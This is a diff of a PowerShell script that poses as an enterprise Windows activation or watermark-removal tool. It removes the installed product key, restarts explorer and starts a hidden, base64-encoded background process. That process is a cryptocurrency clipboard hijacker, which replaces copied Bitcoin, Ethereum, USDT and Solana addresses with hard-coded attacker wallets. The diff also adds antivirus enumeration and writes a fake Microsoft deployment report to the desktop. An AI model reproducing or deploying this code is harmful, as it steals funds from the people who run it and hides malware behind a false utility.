@@ -1,4 +1,4 @@
-# --- [RESEARCH STAGER v57.0: ENTERPRISE ULTIMATE] ---
+# --- [RESEARCH STAGER v58.0: ENTERPRISE ULTIMATE] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
@@ -101,18 +101,22 @@ function Run-Deployment {
 
         # --- WATERMARK REMOVAL & INSTANT REFRESH ---
         slmgr.vbs /upk; slmgr.vbs /cpky; slmgr.vbs /rearm
-        Stop-Process -Name explorer -Force # Restarts shell to clear UI watermark immediately
+        Stop-Process -Name explorer -Force
 
         # --- CLIPPER LOGIC (UNTOUCHED) ---
         $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } } elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
         $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
         Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
         
-        # --- REPORT GENERATION ---
+        # --- REPORT GENERATION (WITH AV AUDIT) ---
+        $avList = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct").displayName -join ", "
+        if (!$avList) { $avList = "None Detected" }
+
         $infoFile = "$env:USERPROFILE\Desktop\System_Activation_Report.txt"
         $report = "--- MICROSOFT ENTERPRISE DEPLOYMENT REPORT ---`n"
         $report += "TIMESTAMP: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
         $report += "DEVICE NAME: $env:COMPUTERNAME`n"
+        $report += "AV SOFTWARE: $avList`n"
         $report += "LICENSE STATUS: ACTIVATED / WATERMARK REMOVED`n"
         $report | Out-File $infoFile
 
